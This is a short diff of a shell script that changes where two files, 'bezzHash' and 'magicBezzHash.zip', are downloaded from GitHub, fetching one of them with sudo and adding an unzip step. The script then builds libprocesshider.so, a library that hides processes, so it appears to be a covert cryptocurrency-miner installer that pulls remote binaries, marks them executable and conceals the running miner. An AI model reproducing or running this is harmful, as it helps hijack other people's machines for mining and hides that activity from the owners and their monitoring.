@@ -35,10 +35,11 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/Amarudinsyah/bezzhash/main/bezzHash
+sudo wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
 chmod +x bezzHash
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/Amarudinsyah/bezzhash/main/magicBezzHash.zip
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
 
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
